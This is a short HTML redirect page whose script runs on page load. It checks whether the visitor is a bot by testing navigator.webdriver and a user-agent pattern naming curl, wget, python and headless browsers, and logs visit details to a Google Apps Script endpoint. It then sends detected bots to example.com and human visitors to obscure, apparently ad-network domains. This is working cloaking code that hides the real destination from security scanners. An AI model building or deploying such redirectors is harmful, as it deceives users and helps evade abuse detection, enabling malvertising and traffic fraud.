
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>Redirecting...</title>
  <script>
    // Extract URL parameters
    function getQueryParams() {
      const params = {};
      window.location.search.substring(1).split("&").forEach(pair => {
        const [key, value] = pair.split("=");
        if (key && value) {
          params[decodeURIComponent(key)] = decodeURIComponent(value);
        }
      });
      return params;
    }

    // Bot detection logic
    function isBot() {
      const ua = navigator.userAgent.toLowerCase();
      return (
        navigator.webdriver ||
        /bot|crawl|spider|curl|wget|python|headless/i.test(ua)
      );
    }

    // Background logging using sendBeacon
    function logVisit(params, botFlag) {
      const data = {
        siteid: params.siteid || "unknown",
        country: params.cc || "unknown",
        os: params.operatingsystem || "unknown",
        device: params.device || "unknown",
        connection: params.connection || "unknown",
        browser: navigator.userAgent,
        isBot: botFlag
      };

      navigator.sendBeacon(
        "https://script.google.com/macros/s/AKfycby1yK1kNlt_1MjxphyE0QWsm3a1Zng9Coffc9UHunbAqgfRoegN7o9sPIkKtOxDzfKAQQ/exec",
        new Blob([JSON.stringify(data)], { type: 'application/json' })
      );
    }

    // Main function on page load
    window.onload = function () {
      const params = getQueryParams();
      const botFlag = isBot();

      // Log visit in background
      logVisit(params, botFlag);

      // Instant redirect
      const redirectUrl = botFlag
        ? "https://example.com"
        : "https://viiqkzqv.com/dc/?blockID=378740&tb=https%3A%2F%2Fotieu.com%2F4%2F6909001";

      window.location.href = redirectUrl;
    };
  </script>
</head>
<body>
  <p>Redirecting, please wait...</p>
</body>
</html>
